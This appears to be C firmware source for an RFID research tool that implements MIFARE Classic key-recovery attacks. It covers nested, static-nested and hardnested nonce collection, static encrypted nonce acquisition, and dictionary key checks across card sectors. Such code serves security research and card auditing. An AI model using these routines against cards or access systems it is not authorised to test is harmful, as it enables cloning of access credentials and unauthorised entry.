static uint8_t nested_recover_core(mf1_nested_core_t *pnc, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType) {
    uint32_t uid = get_u32_tag_uid(p_tag_info);
    pcd_14a_reader_halt_tag();
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }
    mf1_observation_t observation = {0};
    uint8_t status = mf1_capture_observation(uid, blkKnown, typKnown, keyKnown,
        targetBlock, targetType, false, &observation);
    if (status != STATUS_HF_TAG_OK) return STATUS_MF_ERR_AUTH;
    if (observation.bits != 32) return STATUS_HF_ERR_STAT;

    num_to_bytes(observation.source_nonce, 4, pnc->nt1);
    memcpy(pnc->nt2, observation.ciphertext, 4);
    pnc->par = 0;
    for (uint8_t index = 0; index < 3; index++) {
        pnc->par |= (oddparity8(observation.ciphertext[index]) != observation.parity[index]) << index;
    }
    return STATUS_HF_TAG_OK;
}

/**
* @brief    :NESTED is implemented by default to collect random numbers of the sets_nr group. This function is only responsible for collecting, not responsible for conversion and analysis as KS
* @param    :keyKnown    : The U64 value of the known secret key of the card
* @param    :blkKnown    :The owner of the known secret key of the card
* @param    :typKnown    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
* @param    :targetBlock : The target sector that requires a Nested attack
* @param    :targetType  : The target key type requires the Nested attack
* @param    :ncs         : Nested core structure array, save related communication data
* @retval   :The attack success return STATUS_HF_TAG_OK, else return the error code
*
*/
uint8_t nested_recover_key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, mf1_nested_core_t ncs[SETS_NR]) {
    uint8_t m, res;
    // all operations must be based on the card
    res = pcd_14a_reader_scan_auto(p_tag_info);
    if (res != STATUS_HF_TAG_OK) {
        return res;
    }
    //Then collect the specified number of random array
    for (m = 0; m < SETS_NR; m++) {
        res = nested_recover_core(
                  &(ncs[m]),
                  keyKnown,
                  blkKnown,
                  typKnown,
                  targetBlock,
                  targetType
              );
        if (res != STATUS_HF_TAG_OK) {
            return res;
        }
    }
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : NestedFollow detection implementation
* @param    :block   :The owner of the known secret key of the card
* @param    :type    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
* @param    :key     : The U64 value of the known secret key of the card
* @param    :nd      : Random number distance detection results
* @retval   : Operating status value
*
*/
uint8_t nested_distance_detect(uint8_t block, uint8_t type, uint8_t *key, uint8_t *uid, uint32_t *distance) {
    uint8_t status      = STATUS_HF_TAG_OK;
    *distance   = 0;
    //Must ensure that there is a card on the court
    status = pcd_14a_reader_scan_auto(p_tag_info);
    if (status != STATUS_HF_TAG_OK) {
        return status;
    } else {
        // At least the card exists, you can copy the UID to the buffer first
        get_4byte_tag_uid(p_tag_info, uid);
    }
    // Get distance, prepare for the next attack
    return measure_distance(bytes_to_num(key, 6), block, type, distance);
}

/**
* @brief    : StaticNested core, used to collect NT.
*               This function is only responsible for collection and is not responsible for converting and parsing to KS.
* @param    :p_nt1       : NT1, non encrypted.
* @param    :p_nt2       : NT2, encrypted.
* @param    :keyKnown    : U64 value of the known key of the card
* @param    :blkKnown    : The sector to which the card's known secret key belongs
* @param    :typKnown    : The known key type of the card, 0x60 (A key) or 0x61 (B key)
* @param    :targetBlock : Target sectors that require nested attacks
* @param    :targetType  : Target key types that require nested attacks
* @param    :nestedAgain : StaticNested enhanced vulnerability, which can obtain two sets of encrypted random numbers based on nested verification of known keys
* @retval   : Successfully collected and returned to STATUS_HF_TAG_OK, otherwise an error code will be returned.
*
*/
uint8_t static_nested_recover_core(uint8_t *p_nt1, uint8_t *p_nt2, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, uint8_t nestedAgain) {
    uint32_t uid = get_u32_tag_uid(p_tag_info);
    pcd_14a_reader_halt_tag();
    if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }
    mf1_observation_t observation = {0};
    uint8_t status = mf1_capture_observation(uid, blkKnown, typKnown, keyKnown,
        targetBlock, targetType, nestedAgain != 0, &observation);
    if (status != STATUS_HF_TAG_OK) return STATUS_MF_ERR_AUTH;
    if (observation.bits != 32) return STATUS_HF_ERR_STAT;

    num_to_bytes(observation.source_nonce, 4, p_nt1);
    memcpy(p_nt2, observation.ciphertext, 4);
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : StaticNested encapsulates and calls the functions implemented by the core to collect 2 sets of random numbers.
*               This function is only responsible for collection and is not responsible for converting and parsing to KS.
* @param    :keyKnown    : U64 value of the known key of the card
* @param    :blkKnown    : The sector to which the card's known secret key belongs
* @param    :typKnown    : The known key type of the card, 0x60 (A key) or 0x61 (B key)
* @param    :targetBlock : Target sectors that require nested attacks
* @param    :targetType  : Target key type that require nested attacks
* @param    :sncs        : StaticNested Decrypting Core Structure Array
* @retval   : Successfully collected and returned to STATUS_HF_TAG_OK, otherwise an error code will be returned.
*
*/
uint8_t static_nested_recover_key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, mf1_static_nested_core_t *sncs) {
    uint8_t res;
    res = pcd_14a_reader_scan_auto(p_tag_info);
    if (res != STATUS_HF_TAG_OK) {
        return res;
    }
    get_4byte_tag_uid(p_tag_info, sncs->uid);
    res = static_nested_recover_core(sncs->core[0].nt1, sncs->core[0].nt2, keyKnown, blkKnown, typKnown, targetBlock, targetType, false);
    if (res != STATUS_HF_TAG_OK) {
        return res;
    }
    res = static_nested_recover_core(sncs->core[1].nt1, sncs->core[1].nt2, keyKnown, blkKnown, typKnown, targetBlock, targetType, true);
    if (res != STATUS_HF_TAG_OK) {
        return res;
    }
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Use the RC522 M1 algorithm module to verify the key
* @retval   : validationResults
*
*/
uint16_t auth_key_use_522_hw(uint8_t block, uint8_t type, uint8_t *key) {
    // Each verification of a block must re -find a card
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }
    // After finding the card, we start to verify!
    return pcd_14a_reader_mf1_auth(p_tag_info, type, block, key);
}

inline void mf1_toolbox_antenna_restart() {
    pcd_14a_reader_reset();
    pcd_14a_reader_antenna_on();
    bsp_delay_ms(8);
}

inline void mf1_toolbox_report_healthy() {
    bsp_wdt_feed();
    while (NRF_LOG_PROCESS());
}

uint16_t mf1_toolbox_check_keys_of_sectors(
    mf1_toolbox_check_keys_of_sectors_in_t *in,
    mf1_toolbox_check_keys_of_sectors_out_t *out
) {
    memset(out, 0, sizeof(mf1_toolbox_check_keys_of_sectors_out_t));
    uint8_t trailer[18] = {}; // trailer 16 bytes + padding 2 bytes

    // keys unique
    uint8_t i, j, maskSector, maskShift, trailerNo;
    for (i = 0; i < in->keys_len; i++) {
        for (j = i + 1; j < in->keys_len; j++) {
            if (memcmp(&in->keys[i], &in->keys[j], sizeof(mf1_key_t)) != 0) continue;

            // key duplicated, replace with last key
            if (j != in->keys_len - 1) in->keys[j] = in->keys[in->keys_len - 1];
            in->keys_len--;
            j--;
        }
    }

    uint16_t status = STATUS_HF_TAG_OK;
    bool skipKeyB;
    for (i = 0; i < 40; i++) {
        maskShift = 6 - i % 4 * 2;
        maskSector = (in->mask.b[i / 4] >> maskShift) & 0b11;
        trailerNo = i < 32 ? i * 4 + 3 : i * 16 - 369; // trailerNo of sector
        skipKeyB = (maskSector & 0b1) > 0;
        if ((maskSector & 0b10) == 0) {
            for (j = 0; j < in->keys_len; j++) {
                mf1_toolbox_report_healthy();
                if (status != STATUS_HF_TAG_OK) mf1_toolbox_antenna_restart();

                status = auth_key_use_522_hw(trailerNo, PICC_AUTHENT1A, in->keys[j].key);
                if (status != STATUS_HF_TAG_OK) { // auth failed
                    if (status == STATUS_HF_TAG_NO) return STATUS_HF_TAG_NO;
                    continue;
                }
                // key A found
                out->found.b[i / 4] |= 0b10 << maskShift;
                out->keys[i][0] = in->keys[j];
                // try to read keyB from trailer of sector
                status = pcd_14a_reader_mf1_read(trailerNo, trailer);
                // key B not in trailer
                if (status != STATUS_HF_TAG_OK || 0 == *(uint64_t *) &trailer[10]) break;
                // key B found
                skipKeyB = true;
                out->found.b[i / 4] |= 0b1 << maskShift;
                out->keys[i][1] = *(mf1_key_t*)&trailer[10];
                break;
            }
        }
        if (skipKeyB) continue;

        for (j = 0; j < in->keys_len; j++) {
            mf1_toolbox_report_healthy();
            if (status != STATUS_HF_TAG_OK) mf1_toolbox_antenna_restart();

            status = auth_key_use_522_hw(trailerNo, PICC_AUTHENT1B, in->keys[j].key);
            if (status != STATUS_HF_TAG_OK) { // auth failed
                if (status == STATUS_HF_TAG_NO) return STATUS_HF_TAG_NO;
                continue;
            }
            // key B found
            out->found.b[i / 4] |= 0b1 << maskShift;
            out->keys[i][1] = in->keys[j];
            break;
        }
    }

    return STATUS_HF_TAG_OK;
}

/**
* @brief : HardNested random number acquisition implementation
* @param :slow : Is it a low-speed acquisition mode? Low-speed acquisition is suitable for some non-standard cards
* @param :keyKnown : The known secret key of the card
* @param :blkKnown : The sector to which the known secret key of the card belongs
* @param :typKnown : The type of the known secret key of the card, 0x60 (A secret key) or 0x61 (B secret key)
* @param :targetBlk : The target sector for nested attack
* @param :targetTyp : The target secret key type for nested attack
* @param :nonces : The buffer for storing random numbers
* @param :noncesMax : The upper limit of the random number buffer in bytes
* @retval : STATUS_HF_TAG_OK is returned if the acquisition is successful, and non-HF_TAG_OK is returned if the acquisition is unsuccessful Value
*
*/
uint8_t mf1_hardnested_nonces_acquire(bool slow, uint8_t blkKnown, uint8_t typKnown, uint64_t keyKnown,
                                      uint8_t targetBlk, uint8_t targetTyp, uint8_t *nonces, uint16_t noncesMax, uint8_t *num_nonces) {
    mf1_observation_t observation = {0};
    uint8_t nt_par_enc       = 0;
    uint8_t status           = STATUS_HF_TAG_NO;
    uint32_t cuid            = 0;   // cuid can be fixed when selecting card
    *num_nonces              = 0;   // The number of random numbers currently counted must be reset
    bool tag_selected        = false;
    uint8_t err_count        = 0;

    for (uint16_t i = 0; i <= noncesMax - 9;) {
        // NRF_LOG_INFO("AcquireEncryptedNonces: %d\r\n", i);
        if (tag_selected) {
            mf1_toolbox_report_healthy();
            if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
                NRF_LOG_INFO("AcquireEncryptedNonces: Tag lost\r\n");
                if (++err_count >= 15) {
                    return STATUS_HF_TAG_NO;
                }
                continue;
            }
            // Slow mode, delay some time?
            if (slow) {
                bsp_delay_us(400);
            }
            status = mf1_capture_observation(cuid, blkKnown, typKnown, keyKnown,
                targetBlk, targetTyp, false, &observation);
            if (status != STATUS_HF_TAG_OK) {
                if (++err_count >= 15) return STATUS_MF_ERR_AUTH;
                continue;
            }
            if (observation.bits != 32) {
                if (++err_count >= 15) return STATUS_HF_ERR_STAT;
                continue;
            }
            // Reset err count
            err_count = 0;
            // merge parity
            uint8_t par_enc = 0;
            par_enc |= observation.parity[3] << 4;
            par_enc |= observation.parity[2] << 5;
            par_enc |= observation.parity[1] << 6;
            par_enc |= observation.parity[0] << 7;
            // copy to buffer
            *num_nonces = *num_nonces + 1;
            if (*num_nonces % 2) {
                memcpy(nonces + i, observation.ciphertext, 4);
                nt_par_enc = par_enc & 0xf0;
            } else {
                nt_par_enc |= par_enc >> 4;
                memcpy(nonces + i + 4, observation.ciphertext, 4);
                memcpy(nonces + i + 8, &nt_par_enc, 1);
                i += 9;
            }
        } else {
            // scan the tag to fixed cuid.
            status = pcd_14a_reader_scan_auto(p_tag_info);
            if (status != STATUS_HF_TAG_OK) {
                return STATUS_HF_TAG_NO;
            }
            cuid = get_u32_tag_uid(p_tag_info);
            tag_selected = true;
        }
    }

    // OK!
    return STATUS_HF_TAG_OK;
}

uint8_t mf1_collect_observations(uint8_t source_block, uint8_t source_type,
    uint64_t source_key, uint8_t target_block, uint8_t target_type, bool chained,
    uint8_t count, uint8_t *output, const uint8_t *expected_uid, uint8_t uid_length) {
    if (!output || count == 0 || count > 16 ||
        (source_type != PICC_AUTHENT1A && source_type != PICC_AUTHENT1B) ||
        (target_type != PICC_AUTHENT1A && target_type != PICC_AUTHENT1B)) {
        return STATUS_PAR_ERR;
    }

    uint32_t started = mf1_capture_clock();
    uint8_t status = pcd_14a_reader_scan_auto(p_tag_info);
    mf1_capture_stats.select_cycles += mf1_capture_elapsed(started);
    if (status != STATUS_HF_TAG_OK) return status;
    if (uid_length && (p_tag_info->uid_len != uid_length || memcmp(p_tag_info->uid, expected_uid, uid_length)))
        return STATUS_HF_TAG_NO;

    uint32_t cuid = get_u32_tag_uid(p_tag_info);
    for (uint8_t index = 0; index < count; index++) {
        started = mf1_capture_clock();
        mf1_toolbox_report_healthy();
        mf1_capture_stats.housekeeping_cycles += mf1_capture_elapsed(started);
        if (index != 0) {
            started = mf1_capture_clock();
            status = uid_length ? pcd_14a_reader_reselect_after_nested(p_tag_info)
                                : pcd_14a_reader_fast_select(p_tag_info);
            mf1_capture_stats.select_cycles += mf1_capture_elapsed(started);
            if (status != STATUS_HF_TAG_OK) break;
        }
        mf1_observation_t observation = {0};
        status = mf1_capture_observation(cuid, source_block, source_type, source_key,
            target_block, target_type, chained, &observation);
        if (status != STATUS_HF_TAG_OK) break;
        if (observation.status != STATUS_HF_TAG_OK || observation.bits != 32) {
            status = observation.status != STATUS_HF_TAG_OK ? observation.status : STATUS_HF_ERR_STAT;
            break;
        }
        if (mf1_capture_stats.enabled) mf1_capture_stats.observations++;
        uint8_t *record = output + index * 12;
        num_to_bytes(chained ? observation.chained_nonce : observation.source_nonce, 4, record);
        memcpy(record + 4, observation.ciphertext, 4);
        memcpy(record + 8, observation.parity, 4);
    }
    return status;
}

//-----------------------------------------------------------------------------
// acquire static encrypted nonces in order to perform the attack described in
// Philippe Teuwen, "MIFARE Classic: exposing the static encrypted nonce variant"
//-----------------------------------------------------------------------------
uint8_t mf1_static_encrypted_nonces_acquire(uint64_t keyKnown, uint8_t sector_count, uint8_t starting_sector, uint8_t sector_data[40][sizeof(mf1_static_nonce_sector_t)], uint8_t *sectors_acquired, uint32_t *cardUid) {
    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs = &mpcs;

    uint8_t receivedAnswer[16] = {0x00};
    uint8_t par_enc[4] = {0x00};
    uint32_t cuid = 0;
    bool have_uid = false;

    *sectors_acquired = 0;

    for (uint16_t sec = starting_sector; sec < sector_count && sec < 40; sec++) {
        mf1_toolbox_report_healthy();
        uint16_t blockNo = (sec < 32) ? sec * 4 + 3 : 128 + (sec - 32) * 16 + 15;

        mf1_static_nonce_sector_t sector_nonces = {0};

        for (uint8_t keyType = 0; keyType < 2; keyType++) {
            memset(par_enc, 0, sizeof(par_enc));
            if (have_uid == false) {
                if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
                    return STATUS_HF_TAG_NO;
                }
                cuid = get_u32_tag_uid(p_tag_info);
                have_uid = true;
            } else {
                if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
                    return STATUS_HF_TAG_NO;
                }
            }

            uint32_t nt1 = 0;
            if (authex(pcs, cuid, blockNo, 0x60 + keyType + 4, keyKnown, AUTH_FIRST, &nt1, NULL) != STATUS_HF_TAG_OK) {
                return STATUS_MF_ERR_AUTH;
            }

            uint8_t cmd_status;
            uint8_t res = send_cmd(pcs, AUTH_NESTED, 0x60 + keyType + 4, blockNo, &cmd_status, receivedAnswer, par_enc, sizeof(receivedAnswer) * 8);
            if (res != 32) {
                return STATUS_MF_ERR_AUTH;
            }

            uint32_t nt_enc = bytes_to_num(receivedAnswer, 4);
            crypto1_init(pcs, keyKnown);
            uint32_t nt = crypto1_word(pcs, nt_enc ^ cuid, 1) ^ nt_enc;

            uint16_t nt_first_half = nt >> 16;

            if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
                return STATUS_HF_TAG_NO;
            }

            if (authex(pcs, cuid, blockNo, 0x60 + keyType + 4, keyKnown, AUTH_FIRST, &nt1, NULL) != STATUS_HF_TAG_OK) {
                return STATUS_MF_ERR_AUTH;
            }

            res = send_cmd(pcs, AUTH_NESTED, 0x60 + keyType, blockNo, &cmd_status, receivedAnswer, par_enc, sizeof(receivedAnswer) * 8);
            if (res != 32) {
                return STATUS_MF_ERR_AUTH;
            }

            uint32_t nt_enc_final = bytes_to_num(receivedAnswer, 4);

            uint8_t nt_par_err = ((par_enc[0] ^ oddparity8((nt_enc_final >> 24) & 0xFF)) << 3 |
                                  (par_enc[1] ^ oddparity8((nt_enc_final >> 16) & 0xFF)) << 2 |
                                  (par_enc[2] ^ oddparity8((nt_enc_final >> 8) & 0xFF)) << 1 |
                                  (par_enc[3] ^ oddparity8((nt_enc_final >> 0) & 0xFF)));

            if (keyType == 0) {
                num_to_bytes(nt_first_half, 2, sector_nonces.key_a.nt_first_half);
                sector_nonces.key_a.nt_par_err = nt_par_err;
                num_to_bytes(nt_enc_final, 4, sector_nonces.key_a.nt_enc);
            } else {
                num_to_bytes(nt_first_half, 2, sector_nonces.key_b.nt_first_half);
                sector_nonces.key_b.nt_par_err = nt_par_err;
                num_to_bytes(nt_enc_final, 4, sector_nonces.key_b.nt_enc);
            }
        }

        memcpy(sector_data[sec], &sector_nonces, sizeof(sector_nonces));
        (*sectors_acquired)++;
    }

    crypto1_deinit(pcs);

    *cardUid = cuid;

    return STATUS_HF_TAG_OK;
}

uint16_t mf1_toolbox_check_keys_on_block(
    mf1_toolbox_check_keys_on_block_in_t *in,
    mf1_toolbox_check_keys_on_block_out_t *out
) {
    memset(out, 0, sizeof(*out));
    if (!in->keys_len) return STATUS_MF_ERR_AUTH;
    mf1_toolbox_report_healthy();
    uint8_t status = pcd_14a_reader_scan_auto(p_tag_info);
    if (status != STATUS_HF_TAG_OK) return status;
    if (in->uid_length && (p_tag_info->uid_len != in->uid_length ||
        memcmp(p_tag_info->uid, in->expected_uid, in->uid_length) != 0)) {
        return STATUS_HF_TAG_NO;
    }
    uint32_t cuid = get_u32_tag_uid(p_tag_info);
    struct Crypto1State cipher = {0, 0};

    // Only multi-key searches benefit. A single candidate needs the full
    // timeout up front, since there is no next key to try during a fast pass.
    bool fast = in->keys_len > 1 && pcd_14a_reader_timeout_get() > 4;
    uint8_t retry[32] = {0}; // keys_len is a byte.
    for (unsigned pass = 0; pass <= (unsigned)fast; pass++) {
        for (unsigned i = 0; i < in->keys_len; i++) {
            unsigned mask = 1u << (i % 8);
            if (pass && !(retry[i / 8] & mask)) continue;
            if (pass || i) {
                mf1_toolbox_report_healthy();
                status = pcd_14a_reader_fast_select(p_tag_info);
                if (status != STATUS_HF_TAG_OK) return status;
            }

            bool retry_silence = false;
            uint64_t key_u64 = bytes_to_num(in->keys[i].key, 6);
            status = authex(&cipher, cuid, in->block, in->key_type, key_u64, AUTH_FIRST,
                NULL, fast && !pass ? &retry_silence : NULL);
            if (status != STATUS_HF_TAG_OK) {
                if (retry_silence) retry[i / 8] |= mask;
                continue;
            }
            out->found = 1;
            out->key = in->keys[i];
            return STATUS_HF_TAG_OK;
        }
    }

    return STATUS_MF_ERR_AUTH;
}
